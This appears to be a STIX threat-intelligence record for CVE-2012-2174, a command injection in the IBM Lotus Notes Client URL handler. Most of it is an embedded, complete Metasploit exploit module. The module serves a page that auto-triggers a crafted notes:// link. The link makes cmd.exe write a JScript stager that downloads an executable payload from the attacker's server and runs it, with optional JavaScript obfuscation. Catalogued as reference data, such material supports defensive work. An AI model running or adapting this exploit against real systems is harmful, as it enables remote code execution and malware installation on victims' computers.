{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a5675092-5778-4bc0-901a-62661015bd11",
    "created": "2024-08-14T16:42:57.510024Z",
    "modified": "2024-08-14T16:42:57.510028Z",
    "name": "\"IBM Lotus Notes Client URL Handler Command Injection\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/notes_handler_cmdinject.rb",
            "external_id": "notes_handler_cmdinject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2174"
        },
        {
            "source_name": "reference",
            "url": "http://pwnanisec.blogspot.com/2012/10/exploiting-command-injection.html"
        },
        {
            "source_name": "reference",
            "url": "http://www-304.ibm.com/support/docview.wss?uid=swg21598348"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"IBM Lotus Notes Client URL Handler Command Injection\",\n        'Description' => %q{\n          This module exploits a command injection vulnerability in the URL handler for\n          for the IBM Lotus Notes Client <= 8.5.3. The registered handler can be abused with\n          a specially crafted notes:// URL to execute arbitrary commands with also arbitrary\n          arguments. This module has been tested successfully on Windows XP SP3 with IE8,\n          Google Chrome 23.0.1271.97 m and IBM Lotus Notes Client 8.5.2.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Moritz Jodeit', # Vulnerability discovery\n          'Sean de Regge', # Vulnerability analysis\n          'juan vazquez' # Metasploit\n        ],\n        'References' => [\n          [ 'CVE', '2012-2174' ],\n          [ 'OSVDB', '83063' ],\n          [ 'BID', '54070' ],\n          [ 'ZDI', '12-154' ],\n          [ 'URL', 'http://pwnanisec.blogspot.com/2012/10/exploiting-command-injection.html' ],\n          [ 'URL', 'http://www-304.ibm.com/support/docview.wss?uid=swg21598348' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'EXITFUNC' => \"none\",\n          'InitialAutoRunScript' => 'migrate -k -f'\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Automatic', {} ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-06-18',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ]\n    )\n  end\n\n  def exploit\n    @exe_name = rand_text_alpha(2) + \".exe\"\n    @stage_name = rand_text_alpha(2) + \".js\"\n    super\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n\n      @dropped_files.delete_if do |file|\n        win_file = file.gsub(\"/\", \"\\\\\\\\\")\n        begin\n          wintemp = session.sys.config.getenv('TEMP')\n          win_file = \"#{wintemp}\\\\#{win_file}\"\n          # Meterpreter should do this automatically as part of\n          # fs.file.rm().  Until that has been implemented, remove the\n          # read-only flag with a command.\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Failed to delete #{win_file}\")\n          false\n        end\n      end\n    end\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.exe$/\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      register_file_for_cleanup(\"#{@stage_name}\") unless @dropped_files and @dropped_files.include?(\"#{@stage_name}\")\n      register_file_for_cleanup(\"#{@exe_name}\") unless @dropped_files and @dropped_files.include?(\"#{@exe_name}\")\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    if datastore['SSL']\n      schema = \"https\"\n    else\n      schema = \"http\"\n    end\n    uri = \"#{schema}://#{my_host}\"\n    uri << \":#{datastore['SRVPORT']}#{get_resource()}/#{rand_text_alpha(rand(6) + 3)}.exe\"\n\n    script = \"var w=new ActiveXObject('wscript.shell');\"\n    script << \"w.CurrentDirectory=w.ExpandEnvironmentStrings('\\\\%TEMP\\\\%');\"\n    script << \"var x=new ActiveXObject('Microsoft.XMLHTTP');\"\n    script << \"x.open('GET','#{uri}', false);\"\n    script << \"x.send();\"\n    script << \"var s=new ActiveXObject('ADODB.Stream');\"\n    script << \"s.Mode=3;\"\n    script << \"s.Type=1;\"\n    script << \"s.Open();\"\n    script << \"s.Write(x.responseBody);\"\n    script << \"s.SaveToFile('#{@exe_name}',2);\"\n    script << \"w.Run('#{@exe_name}');\"\n\n    vmargs = \"/q /s /c echo #{script} > %TEMP%\\\\\\\\#{@stage_name}& start cscript %TEMP%\\\\\\\\#{@stage_name}& REM\"\n\n    link_id = rand_text_alpha(5 + rand(5))\n\n    js_click_link = %Q|\n    function clickLink(link) {\n      var cancelled = false;\n\n      if (document.createEvent) {\n        var event = document.createEvent(\"MouseEvents\");\n        event.initMouseEvent(\"click\", true, true, window,\n          0, 0, 0, 0, 0,\n          false, false, false, false,\n          0, null);\n        cancelled = !link.dispatchEvent(event);\n      }\n      else if (link.fireEvent) {\n        cancelled = !link.fireEvent(\"onclick\");\n      }\n\n      if (!cancelled) {\n        window.location = link.href;\n      }\n    }\n    |\n\n    if datastore['OBFUSCATE']\n      js_click_link = ::Rex::Exploitation::JSObfu.new(js_click_link)\n      js_click_link.obfuscate(memory_sensitive: true)\n      js_click_link_fn = js_click_link.sym('clickLink')\n    else\n      js_click_link_fn = 'clickLink'\n    end\n\n    html = <<-EOS\n    <html>\n    <head>\n    <script>\n    #{js_click_link}\n    </script>\n    </head>\n    <body onload=\"#{js_click_link_fn}(document.getElementById('#{link_id}'));\">\n    <a id=\"#{link_id}\" href=\"notes://#{rand_text_alpha_upper(3 + rand(3))}/#{rand_text_alpha_lower(3 + rand(3))} -RPARAMS java -vm c:\\\\windows\\\\system32\\\\cmd.exe -vmargs #{vmargs}\"></a>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending html\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-06-18",
    "x_mitre_platforms": [
        "win'"
    ]
}